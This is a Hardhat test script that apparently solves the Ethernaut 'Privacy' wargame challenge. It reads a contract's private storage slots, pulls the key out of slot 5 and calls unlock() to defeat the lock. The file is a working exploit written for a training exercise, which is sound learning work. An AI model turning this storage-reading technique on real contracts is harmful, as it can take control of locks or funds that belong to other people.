import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";


describe("privacy", function() {
    it("Should solve privacy challenge", async function(){
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function unlock(bytes16 _key) public",
            "function locked() public view returns (bool)",
        ]
        const targetAddr = "0xD2f4F9E64a9AdB493760da55E51D12312b576244";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // dump first 10 storage slot
        for (let i = 0; i < 10; i++) {
            let slot = await eoa.provider!.getStorageAt(targetCont.address, i);
            console.log(`${i}: ${slot}`);
        }

        /*
        * output of above loop
        * 0: 0x0000000000000000000000000000000000000000000000000000000000000001
        * 1: 0x0000000000000000000000000000000000000000000000000000000060a35e1b
        * 2: 0x000000000000000000000000000000000000000000000000000000005e1bff0a
        * 3: 0x0ce97d89247d2c3fedc102bdac65162863cfe9ce4d41ad8197fb29d5f36b02e9
        * 4: 0xaf6076e8e5757f5d9f807330069694a10b8ca455aba4404715c02cee360a47be
        * 5: 0xde8de65ee1dc83b9a8504fbef33d9388167d5efca620c2b816405989ad6b316a
        * 6: 0x0000000000000000000000000000000000000000000000000000000000000000
        * ....
        * Variables stored 
        * 0: bool locked
        * 1: uint256 ID
        * 2: from LSB to MSB 
        *   - uint8 flattening
        *   - uint8 denomination
        *   - uint16 awkwardness
        * 3: bytes32[0]
        * 4: bytes32[1]
        * 4: bytes32[2]
        */
       
        // _key == bytes16(data[2])
        const slot5 = await eoa.provider!.getStorageAt(targetCont.address, 5);
        let key = '0x' + slot5.slice(2, 34);
        console.log(key);

        let tx = await targetCont.unlock(key);
        await tx.wait();
        console.log(tx);

        let isLocked = await targetCont.locked();
        expect(isLocked).to.be.false;
    });
});